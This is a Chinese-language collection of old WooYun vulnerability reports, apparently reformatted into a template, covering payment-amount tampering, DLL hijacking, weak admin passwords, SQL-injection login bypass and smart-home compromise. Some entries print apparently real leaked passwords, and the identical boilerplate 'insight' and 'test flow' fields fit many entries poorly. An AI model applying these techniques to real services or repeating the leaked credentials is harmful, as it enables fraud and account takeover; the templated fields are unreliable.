**POC**: 有这么个论坛：简单社工了以下这个账号的用户，发现经常使用126的邮箱，然后...https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 看了下，貌似我检测的这几家，你家算是比较大的，比“团贷网”如何有节操的白帽子，仅测试漏洞
---

---
### [wooyun-2015-0145508] 华润招聘某漏洞导致任意文件查看/下载/后台弱口令导致大量简历信息泄漏
**厂商**: 华润E万家 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入, 认证接口, 上传功能, 后台管理

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.华润下面的招聘平台：https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-033779] Chrome浏览器DLL劫持漏洞
**厂商**: Google | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: Chrome浏览器(版本号27.0.1453.116) windows xp sp3环境运行chrome.exe会试图加载同目录下的Chrome.dll文件，但该DLL文件不存在，而是在子目录27.0.1453.116下，造成攻击者可以伪造假的Chrome.dll文件放置于安装目录下，Chrome运行时即可被加载于Chrome进程中，实现提权或其它恶意行为。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 厂商懂得。
---

---
### [wooyun-2015-095795] 长沙有道公司信息泄露（可漫游沦陷公司和第三方整体网络控制）
**厂商**: 长沙有道 | **年份**: 2015 | **类型**: 内部绝密信息泄漏

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 内部绝密信息泄漏防护不足，开发者信任前端输入

**测试流程**:
1. 识别内部绝密信息泄漏相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某天无意间在互联网上扫到的很多password。可能出自一篇文档。看了看，这是不是就属于无条件控制业务逻辑。所以选的高危，也不懂。。1陈燕燕某搜索引擎贴吧：https://example.com/[已脱敏]    密码：yd82059760某搜索引擎百科https://example.com/[已脱敏]    密码：yd82059760某搜索引擎知道：https://example.com/[已脱敏]    密码：yd82059760某搜索引擎空间https://example.com/[已脱敏]    密码：yd8205976058同城网：http:

**POC**: (见原文)

**绕过**: 直接利用

**修复**: #提高安全意识#避免密码泄露
---

---
### [wooyun-2015-0103737] 51wan某分站支付漏洞
**厂商**: 51wan.com | **年份**: 2015 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏] （会员中心）进入开年费会员的页面；然后进入某电商平台网银支付；接着；

**POC**: POST /index.php?module=trade&control=confirm&xy=yearcard-19--0 HTTP/1.1Host: pay.51wan.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Acc

**绕过**: 直接利用

**修复**: 很严重的漏洞啊～赶紧修复吧，求高rank，求礼物～～
---

---
### [wooyun-2015-0129142] 途牛旅游网某业务存在严重逻辑漏洞
**厂商**: 途牛旅游网 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 途牛旅游网整个业务的旅游卷业务存在支付漏洞；（旅游券等同于现金使用，直接抵扣订单金额。），支持处介绍如下图所示：导致可免费到游（说走咱就走呀！）验证了两个业务，一个是旅游时，旅游劵支付，一个是无线购买时旅游劵支付；以面是旅游时旅游劵支付为例；问题依然出在旅游劵支付时，选择使用旅游劵，这里随便输入编号和密码；如下图所示：抓包：如下图所示：然后对响应进行编辑修改，如上图所示：设置完；对返回的响应进行修改，如下图所示：这里会返回可用劵的额度，不存在是-2,我这把-2修改成2000，页面展示如下图所示：然后，然后就是下一步，下一步了，直至提交完成订单；如下是（日本wifi热点设备租赁(AU)）免费的就租用个贵的吧，500一天；抓包修改返回的旅游卷值为1000，如下图所示：可以看到，我充了1000，用了500，我网上支付不在需要付钱；如下图所示：over，就这样吧！

**POC**: 如上已证明！

**绕过**: 直接利用

**修复**: 你懂的，服务端做验证吧！
---

---
### [wooyun-2014-087799] 安全管家客户端任意号码拦截漏洞（可使恶意软件绕过短信权限控制）
**厂商**: 安全管家 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 安全管家Android客户端将号码的黑白名单以及关键字拦截的数据库以ContentProvider方式导出给第三方程序使用，而没有对调用方进行验证，导致拦截功能被滥用。

**POC**: 1.版本信息:apk  : com.anguanjia.safe, 203, 4.9.6, 安全管家apkmd5: 950574938df8253b0eff4155213d64da证书 :certmd5: d96a400b3079c1838e0818fa5f1e4e7aissuer: C=CN, ST=China, L=Beijing, O=Beijing AnGuanJia Technology Co. Ltd.,OU=AnGuanJia, CN=AnGuanJiasubject: C=CN, ST=China, L=Beijing, O=Beijing AnGuanJia Technolo

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0139556] 锦江之星积分兑换逻辑错误(支付漏洞)
**厂商**: 锦江之星旅馆有限公司 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 积分兑换  礼品兑换处，可以修改积分+金额的金额值，导致1元兑换产品。先来看一看随便一个兑换物品的详情，可以发现是积分+金额的。点击兑换，拦截数据包，在提交订单转向银联支付页面，修改支付金额为1块钱。跳转到银联支付页面。支付成功。看看订单状态。显示订单状态成功。之后不久再次查看订单状态显示状态又变成未支付了，看来是后台审核发现问题的，为锦江之星的后台人员赞一个，但是这种1元订单的问题也不容忽视。

**POC**: 如上

**绕过**: 直接利用

**修复**: 这些涉及金额之类的敏感数据最好是和会话做绑定，防止订单提交过程中数据被篡改。
---

---
### [wooyun-2015-0140886] 美洽网设计逻辑缺陷可任意密码重置（影响大量网站）
**厂商**: meiqia.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、找回密码https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-034450] 杀软防御机制设计不当可导致可能被利用为计算机后门
**厂商**: 某搜索引擎 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先我在网上找了一个DLL病毒 所有杀软都会报。截图如下我们找到某搜索引擎杀毒的根目录，看看DLL文件~我们先测试是否可以运行这个病毒，把病毒用文本格式打开，在开头加"cc"字母锁定目标~然后去改刚才的DLL病毒文件名然后运行运行结果打开任务管理器看看豁出去了！把那加的俩字母删掉~再次。。。。再次运行。。运行成功！！！再看看运行之后杀软的防御、主动防御都没有任何提示，自动放行了。

**POC**: 上面

**绕过**: 直接利用

**修复**: 坐等忽略
---

---
### [wooyun-2015-0113177] 信步游戏官网找回密码逻辑漏洞可修改管理员密码以及琐碎小洞合集
**厂商**: 信步游戏 | **年份**: 2015 | **类型**: 账户体系控制不严

**元思考**: 触发信号: 认证接口

**洞察**: 账户体系控制不严防护不足，开发者信任前端输入

**测试流程**:
1. 识别账户体系控制不严相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 随意注册测试账号，然后找回密码邮件发送到邮箱，此处注意发件邮箱。进入连接，输入新密码123456brup拦截改包，把要改的邮箱改成刚才注意到的发件人邮箱成功修改密码并登陆其实不用这么麻烦。登陆处直接可以万能密码' or '1'='1登陆然而登陆了并没有什么卵用.

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 修改密码的那个POST也要验证TOKEN啊啊啊啊啊啊，以及登陆处过滤注入啊啊啊啊啊啊其实我是参加了你们那个信步杯的选手，友情检测，能给点小礼物不
---

---
### [wooyun-2015-096706] 某视频网站客户端存在可信任路径代码执行漏洞
**厂商**: 某视频网站 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 每一次打开某视频网站客户端时，都会打开一个来自exe文件所在盘的根目录下的program.exe。测试版本：打开客户端时：

**POC**: 测试版本：打开客户端时：

**绕过**: 直接利用

**修复**: 加上引号
---

---
### [wooyun-2014-085768] 赛奇网络某处逻辑漏洞导致数站管理员用户密码泄漏（包括域名注册万网,某电商平台,Cnss,DZ沦陷,个人博客,PHP站,全权告急）
**厂商**: 赛奇网络 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 是关于赛奇网络的https://example.com/[已脱敏]   密码是123456登陆后,可以用户名,这些用户名其实密码都是123456=============================================重要的是,打开账号管理中心可以看到很多地址你其实可以看到了,你懂的,密码全在这里包括网站后台的地址,用户名及管理员密码,全部泄露=-==================================随便打开1个尝试https://example.com/[已脱敏]

**POC**: 赛奇优化系统 https://example.com/[已脱敏]      sq03 123456https://example.com/[已脱敏]  saiqiruizhi@某邮箱.com   sqrz@152346天涯https://example.com/[已脱敏]    人品不错2014   sqrzgs1民众健康网  https://example.com/[已脱敏]   某互联网公司5076966新闻源管理系统 https://example.com/[已脱敏]   赛奇网络926 saiqiwangluoE动力 https://example.com/[已脱敏]  26

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2013-021250] 从某知名厂商MIS软件逻辑缺陷谈对某工控网络的渗透
**厂商**: 国家安全生产监督管理总局 | **年份**: 2013 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: SyncPlant是为南京科远自动化集团股份有限公司为发电企业量身打造的智能一体化信息系统解决方案，完美整合生产管理、设备资产、经营管理、人力资源、行政综合、实时监控（SIS）、工程项目（基建MIS）KKS编码等业务管理系统为一体。以下测试版本根据反馈结果为SyncPlant V4.0。

**POC**: 1，远程web登录2，未登录状况下多个页面可以匿名访问，下面以用户列表举例，如图3，查询后可列出所有用户名，点重置密码后可以重置任意用户密码为初始密码8888884，提示成功后返回登录界面工号即登录用户名,使用初始密码即可登录5，该平台功能比较强大，功能也相当多，再加载ocx后可查看各个生产线的实时运行状态，找到文件上传处即可上传任意文件得到网站的shell6，以当前测试服务器的环境来说网络环境位于内网，远程桌面没开，系统装有pcanywhere11.5，被控端启用TCP,监听默认5631端口,尝试下载pcanywhere的.cif密码文件解密后只得到用户名administrator密码无，之

**绕过**: 编码绕过

**修复**: 联系软件厂商寻求技术支持改善内网安全
---

---
### [wooyun-2011-01413] 微软ASP拒绝服务漏洞
**厂商**: 微软 | **年份**: 2011 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 参数注入

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 一段演示代码：<%on error resume nextconnstr="DBQ="+server.mappath("data/nxnews.mdb")+";DefaultDir=;DRIVER={Microsoft Access Driver (*.mdb)};"Set conn=Server.CreateObject("ADODB.CONNECTION")conn.open connstrid=request("id")Set rs= Server.CreateObject("ADODB.Recordset")sql="select * from NEWS where id="&idrs.open sql,conn,1,1if  not rs1.EOF	thenResponse.Write ("当前指针没在结尾<br />")end ifif  rs1.EOF	thenRespons

**POC**: demo：下载这个图片，用rar打开如有问题，可联系本人邮箱

**绕过**: 直接利用

**修复**: 严格校验输入参数
---

---
### [wooyun-2013-036582] 团乐购网团购逻辑存在支付漏洞可0元购买商品
**厂商**: tuanlego.com | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: 花了10块钱购买，求礼物 求高rank

**绕过**: 直接利用

**修复**: 订单审核更加严谨点
---

---
### [wooyun-2013-037409] 多款某互联网公司网络游戏DLL劫持（6款游戏）
**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 游戏：某互联网公司飞车劫持程序：某互联网公司Speed_loader.exe版本：[IP已脱敏]测试时安装路径C:\OnlineGame\网络游戏\某互联网公司飞车\Releasephysx27\劫持如下不存在的DLL：C:\OnlineGame\网络游戏\某互联网公司飞车\Releasephysx27\networkchs.dllC:\OnlineGame\网络游戏\某互联网公司飞车\Releasephysx27\networkcht.dllC:\OnlineGame\网络游戏\某互联网公司飞车\Releasephysx27\networkloc.dllC:\OnlineGame\网络游戏\某互联网公司飞车\Releasephysx27\externalcontrolchs.dllC:\OnlineGame\网络游戏\某互联网公司飞车\Releasephysx27\externalcontrolcht.dllC:\OnlineGame\网络游

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们比我懂！
---

---
### [wooyun-2015-0145033] Wifi万能钥匙AppS12345678tore版存在设计缺陷实现无限次数连接运营商热点
**厂商**: WiFi万能钥匙 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.在已经成功通过运营商热点连接互联网之后再次通过Wifi万能钥匙进行连接会重复扣除连接次数，造成了资源的大量浪费。2.在连接次数只有1的时候，无法连接运营商热点(经过多次确认），具体表现为：点击连接，提醒连接次数不足，而次数已经被减少为0.3.根据对APP网络连接的分析,只要能过阻止**.**.**.****.**.**.****.**.**.**这三个域名的连接即可实现次数为0的时候依然可以连接（但不提示成功）。具体方法可以修改hosts文件。

**POC**: wifi万能钥匙网络连接请求测试：此时连接次数为0我们连接上CMCC-WEB，执行下方测试代码，再次回到万能钥匙页面，点击连接，多次尝试得到同一个结果：连接失败这时已经可以访问互联网了，打开浏览器，随便打开一个网页确认问题存在。

**绕过**: 直接利用

**修复**: 1.优化程序设计，先验证是否已经连接互联网再确认是否需要连接，避免资源浪费。2.更改次数确认方式，次数为1时允许连接。3.随着iOS设备的升级，越狱人数已经减少，不越狱的用户极少能做到上述操作，结合iOSwifi的自动断线的特点，可以尝试更改连接规定，如同一设备连接成功之后一段时间内可以重新连接不扣
---

---
### [wooyun-2015-0145184] 浙江省湖州网络学院后台存在弱口令
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 后台弱口令

**元思考**: 触发信号: 功能测试

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**/index.jsp用户名：123456密码：123456

**POC**: 信息泄露：自带的短信群发功能可实现短信轰炸：

**绕过**: 直接利用

**修复**: 修改弱口令
---

---
### [wooyun-2015-0116594] 工行旗下某系统存在弱口令（验证码绕过）
**厂商**: 某国有银行 | **年份**: 2015 | **类型**: 后台弱口令

**元思考**: 触发信号: 认证接口

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 工行瑞信https://example.com/[已脱敏])。。0x02.弱口令payload中的password部分为base64加密，用弱口令“888888”一会就可以跑出好几个。登录后，可以看到一些银行内部信息。不同的账号权限好像不一样，看到的信息不一样，没有一一去看。

**POC**: (见原文)

**绕过**: 过滤绕过

**修复**: 加强输入验证
---

---
### [wooyun-2014-048255] 58同城账户冻结逻辑漏洞
**厂商**: 58同城 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 之前上58同城，因为平时比较喜欢电子设备，所以今年出了很多手机和设备，但是不知道58同城是什么机制，因为我出的东西太多了，所以58同城认为我是商家，然后到了后面，不知道怎么回事又冻结了我的账户，在偶然的一次，发现了这个问题，58同城当账户被冻结的时候同样可以发布信息。当账户冻结的时候，我通过iphone手机客户端，登录网页版的58同城，然后先没有登录，点击发布信息，我再填写了详细的设备信息过后，点击发布，选择登录，我选择手机登录，输入账户密码，就直接登录成功了，我觉得这一步是没有经过验证，如果仔细查查不知道还有不有其他的安全问题。而且我的这个被冻结的账户到现在信息还是存在的。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 不会修复，抱歉！
---

---
### [wooyun-2015-0148542] 某手机厂商某智能家电存在漏洞可被渗透导致整个智能家居网络沦陷（无线局域网测试案例）
**厂商**: 某手机厂商 | **年份**: 2015 | **类型**: 设计不当

**元思考**: 触发信号: 认证接口

**洞察**: 设计不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞名称:某智能电视盒子存在逻辑漏洞可被渗透攻击途径:远程地是否需要认证:无需认证机密性:完全地可用性:完全地完整性:完全地攻击复杂度:低影响范围:某智能电视盒子（仅测试了迷你版，版本号如图）某智能电视盒子由于缺乏认证机制，导致某智能电视盒子手机APP（投屏神器）可直接扫描局域网内某智能电视盒子，无需密码认证可直接连接（默认设置）。而某智能电视盒子账号可控制各种智能家居设备，如电器智能开关，手环，摄像头甚至汽车盒子。本案例中通过首先突破家庭WIFI,登陆某智能电视盒子，通过盒子作跳板劫持所有智能家电，偷看主人睡觉监控主人出行，甚至给主人车子开窗。由于某手机厂商账号与某电商平台绑定，可导致资金损失。由于存在逻辑漏洞，还可以绕过屏幕认证给某智能电视盒子植入后门程序长期潜伏女神周围。漏洞直接影响：某手机厂商帐号体系在无线网范围内形同虚设，智能家居（本案例中为小蚂蚁摄像头，智能插座，某手机厂商放大器，某智能电视盒子及连接的电视），与某手机厂商帐号绑定的某电商平台帐号（购买某手机厂商产品或购

**POC**: 一、某智能电视盒子版本号信息二、某手机厂商路由器无线WIFI的攻克三、连入局域网后对某智能电视盒子进行攻击四、修改配置植入代码等五、消费某手机厂商账户或者绑定的某电商平台里面的金钱六、智能家居电器完全沦陷可杀人放火（有智能插座连接电磁炉电饭煲）七、危害扩展之智能手环篇（无法容忍的隐私信息泄漏，危害超过前面的那个摄像头）八、危害扩展之各种汽车盒子*（以可以解锁汽车的图吧盒子为例）八、被测试网络环境九、测试前后路由器日志记录对比

**绕过**: 过滤绕过

**修复**: 1、某投屏APP仅能在登录状态下访问本帐号绑定的某智能电视盒子。2、某智能电视盒子增加认证机制。3、某智能电视盒子可设置连接设备黑白名单。
---

---
### [wooyun-2014-057370] 一分钱续费某市广电宽带（支付漏洞）
**厂商**: 广电宽带 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 前段时间办理的广电4M宽带到期了，之前客服打过电话让过去续费，由于离他们的营业厅有一段距离加上在家的时候不怎么上网，真要上网的话就蹭蹭邻居小伙伴的WIFI，所以迟迟一个月没有过去续费。今天上网找了一下，发现可以在当地的营业厅上续费。输入宽带帐号，用户名登陆进去。找到付费界面，选择套餐价格进入支付页面。

**POC**: 在点击缴费按钮时打开代理进行拦截，成功拦下post包，修改包中的transAmt的值后重新提交——》OK转到支付界面（现在变成0.01元了）————》输入卡号密码支付成功。此时银行发来扣费短信回到个人中心查看，已经续费成功。仅作测试用，弄了个价格最低的套餐我和我的小伙伴再也不用蹭别人家的WIFI了。

**绕过**: 直接利用

**修复**: 传递数据时进行签名认证吧
---

---
### [wooyun-2014-077184] 某购票系统存在支付漏洞
**厂商**: 珠海公共交通运输集团有限公司 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 十一要回家购票了,没时间去车站,看了下我大珠海有没有晚上购票的,然后就搜到了https://example.com/[已脱敏]

**POC**: 同上

**绕过**: 直接利用

**修复**: 关于钱的就不要那么懒,要后台计算一下嘛!安全意识有待提高订单号:9039602097733010 可以取消了送个码吧!
---

---
### [wooyun-2014-058717] 某国有银行网银体验机绕过
**厂商**: 某国有银行 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 上传功能

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网银体验机“联系我们”下点击邮箱地址，激活xp系统的outlook，而且系统cmd.exe存在，可直接上传附件打开，如图。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你懂的……
---

---
### [wooyun-2015-0138460] 大众客户端设计缺陷可向用户推送广告或恶意信息
**厂商**: 大众点评 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.大众点评客户端的com.dianping.base.app.AlertActivity为导出的且无任何权限限制2.任意的应用在非root的设备上可以通过该intent发送消息唤起该Activity，并可以自定义任意的内容与标题，具体怎么玩大家可以发挥想象力了

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 禁止AlertActivity组件的导出
---

---
### [wooyun-2014-048997] Windows XP 注册表编辑器 缓冲区溢出漏洞
**厂商**: Microsoft | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 解析问题，导致缓冲区溢出漏洞。poc构造很简单。我是这样构造的。1 随意找一个注册表，打开注册表项搜索Notepad.exe2 找到后 导出来，命名为poc.reg3 在文件路径内加入100H个"..\"4 保存。点击。加入注册表5 打开注册表，找到刚刚新添加的那一项。点击导出。输入文件名。6 这时候regdit.exe就崩溃了。poc.REG信息（将下列文件以文本的形式保存。重命名为poc.REG）Windows Registry Editor Version 5.00[HKEY_CLASSES_ROOT\*\OpenWithList\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 重写解析代码
---

---
### [wooyun-2012-09375] 佳域手机官方商城支付漏洞
**厂商**: 佳域手机官方商城 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.立即支付页面修改表单信息2.生成的交易中转页面，支付金额与id、事件等字段对应关系合法3.交易页面

**POC**: 1.我的订单第二条订单，状态为等待补款，未全款支付却已经发货2.订单详情付款0.01元，尚未完成订单，已发货3.为订单付款4.快件状态5.顺快递签收单6.手机

**绕过**: 直接利用

**修复**: 。
---

---
### [wooyun-2012-016193] 某国有银行免费买车漏洞
**厂商**: 某国有银行 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 今天在逛网商,无意看到了某国有银行的在线商城.于是就测试了下.发现存在重大逻辑问题.首先我们先找一个商品,这里我来买辆车.随便选了一辆.我们来买买看.在添加到购物车时抓包.将数量改为负值.这一步我们看到已经修改成功了.但是我们还不能确定问题存在,因为很多在线商城都会在下一步支付的时候进行认证.我们继续来看.这个时候我们发现,金额任然是负数.我们下单看下.这时我们可以看到,金额已经恢复成正数,但是由于数量是负值.导致最终金额也变为负值.由于银行无法支付负值,所以导致我们在这一步的时候失败了.我们换个思路.买不起车.买卷纸吧.具体干什么你们懂的.我们可以看到下图.邮费是按照商品购买数量来计算的.商品数量是负值,所以邮费也是负值.所以最后得到的金额还是负数,无法购买成功.如果我们在确定邮费的环节.将邮费修改成一个我们想要的负值呢?如下图9800块的纸巾被修改成了1块钱.可以支付.换个金额少的订单支

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 逻辑错误修复下吧.
---

---
### [wooyun-2015-0123842] 盖象商城存在支付漏洞
**厂商**: 盖象商城 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 盖象商城：https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 不懂...
---

---
### [wooyun-2014-067309] 某充值软件存在严重充值漏洞可能导致免费充值
**厂商**: 某充值平台 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 之前笔者曾经通过官方的CNNVD渠道提交过北京市政公交一卡通的充值漏洞，一共提了两个：一个是余额为负的情况下的充值漏洞；另一个是任意充值退款的漏洞。很高兴看到余额为负数的漏洞被修复了，但修复只是界面上进行了屏蔽，修复方法有点勉强吧。另一个较为严重的任意充值退款漏洞在目前的最新版本V1.0.09中仍然存在。由于CNNVD很不给力，迟迟没有给予回复，且漏洞到目前仍然存在，因此决定在乌云平台上公布该漏洞。（漏洞相关厂商：hzt360.com）

**POC**: 1.查看当前公交卡余额11.2元。2.充值，选择金额10元，并提交。3.使用某电商平台进行正常交易，并付款成功。4.之后进行写卡操作，并同时对手机通过的流量进行拦截，并在进行到其中某一步的时候丢弃其发向服务器的数据包。5.此时软件提示“验签失败”。6.点击后退按钮，撤销本次充值操作。7.于是温馨提示要退款给我。8.收到短信。9.再次扫描下公交卡，多了10元。后面证明也成功退款到了我的账户，就不截图了。

**绕过**: 直接利用

**修复**: 修改程序流程。该漏洞个人认为非常严重，需要从软件的代码流程上下手才能解决根本问题，而不是从服务器上（目前看到一天限制退款两次）或者从软件界面上解决问题。另外，漏洞发现不易，截图一步一步操作更不易，如果漏洞已经修补或者确认，麻烦告知漏洞发现者，这也是对漏洞发现者辛苦劳动的尊重。
---

---
### [wooyun-2015-0144996] 某电商平台金融Android客户端更新URL地址可被劫持
**厂商**: 某电商平台商城 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 客户端启动是通过http请求获取最新客户端版本信息，其中含有下载地址URL，攻击者可通过中间人劫持替换服务端返回响应信息中url地址，使得用户手机中安装恶意程序（带有恶意程序的某电商平台金融客户端）。用烂了的攻击场景就是在咖啡厅搞中间人劫持。

